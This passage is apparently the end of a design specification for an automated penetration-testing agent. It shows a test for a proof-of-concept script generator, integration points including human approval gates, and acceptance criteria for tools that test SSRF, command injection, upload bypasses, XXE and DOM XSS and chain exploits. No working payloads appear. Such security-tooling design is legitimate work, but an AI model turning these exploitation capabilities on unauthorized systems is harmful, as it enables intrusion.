        result = gen.generate(findings, "test-engagement")
        assert "requests" in result.python_script
        assert "curl" in result.bash_script
        assert len(result.postman_collection["item"]) == 1
```

---

## Integration Points

1. **Input**: Verified findings from Phase 5 GuardedVulnAgent
2. **Output**: Exploitation results + PoC scripts + attack chains in knowledge graph
3. **Temporal**: Human-in-the-loop approval gates for CRITICAL risk (wired in Phase 7)
4. **Browser**: Playwright sessions managed per engagement, isolated contexts
5. **Knowledge Graph**: Session/Credential nodes created, ENABLES edges for attack chains
6. **Events**: Publish exploit events to EventBus for real-time monitoring

## Acceptance Criteria

- [ ] SSRFTool tests all payload variants against target
- [ ] CommandInjectionTool detects both response-based and timing-based injection
- [ ] FileUploadTool tests extension and content-type bypasses
- [ ] XXETool tests classic and blind XXE variants
- [ ] BrowserWorker authenticates, captures DOM state, tests DOM XSS
- [ ] GuardedExploitAgent chains exploits via knowledge graph queries
- [ ] PoCGenerator outputs working Python/Bash/Postman replay scripts
- [ ] All CRITICAL actions gate through policy engine
- [ ] All tests pass